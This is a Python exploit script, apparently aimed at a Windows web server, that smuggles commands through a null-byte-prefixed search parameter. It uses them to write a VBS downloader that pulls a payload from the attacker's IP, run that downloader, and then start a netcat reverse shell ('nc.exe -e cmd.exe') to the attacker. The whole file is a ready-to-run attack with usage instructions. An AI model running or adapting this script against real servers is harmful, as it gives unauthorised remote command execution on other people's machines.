import urllib.request
import sys

def script_create():
    """This function sends the initial request to create the VBS script."""
    try:
        urllib.request.urlopen("http://" + sys.argv[1] + ":" + sys.argv[2] + "/?search=%00{.+" + save + ".}")
        print("[+] VBS script creation request sent.")
    except Exception as e:
        print(f"[.] Error during script creation: {e}")

def execute_script():
    """This function sends a request to execute the saved VBS script."""
    try:
        urllib.request.urlopen("http://" + sys.argv[1] + ":" + sys.argv[2] + "/?search=%00{.+" + exe + ".}")
        print("[+] VBS script execution request sent.")
    except Exception as e:
        print(f"[.] Error during script execution: {e}")

def nc_run():
    """This function sends a request to run netcat with a reverse shell."""
    try:
        urllib.request.urlopen("http://" + sys.argv[1] + ":" + sys.argv[2] + "/?search=%00{.+" + exe1 + ".}")
        print("[+] Netcat reverse shell request sent.")
    except Exception as e:
        print(f"[.] Error during Netcat execution: {e}")

# Define local IP address and port
ip_addr = "10.11.106.164"  # Local IP address for reverse connection
local_port = "8045"          # Local port number for reverse shell

# Define VBS script content encoded for the web request
vbs = r"C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%22http://" + ip_addr + "/payload.vbs%22%2CFalse%0D%0AxHttp.Send%0D%0AbStrm.Open%0D%0AbStrm.Type%20%3D%201%0D%0AbStrm.Write%20xHttp.responseBody%0D%0AbStrm.Position%20%3D%200%0D%0AbStrm.SaveToFile%20%22C:\\Users\\Public\\script.vbs%22%2C%202%0D%0AbStrm.Close()"

# Command to save the VBS script
save = "save|" + vbs

# Command to execute the VBS script
vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
exe = "exec|" + vbs2

# Netcat reverse shell execution command
vbs3 = f"C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20{ip_addr}%20{local_port}"
exe1 = "exec|" + vbs3

# Main script execution
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("""[.] Incorrect usage.
Usage: python exploit.py <Target IP address> <Target Port Number>
Also, don't forget to change the Local IP address and Port number in the script.""")
        sys.exit(1)
    
    try:
        script_create()
        execute_script()
        nc_run()
    except Exception as e:
        print(f"[.] Something went wrong: {e}")
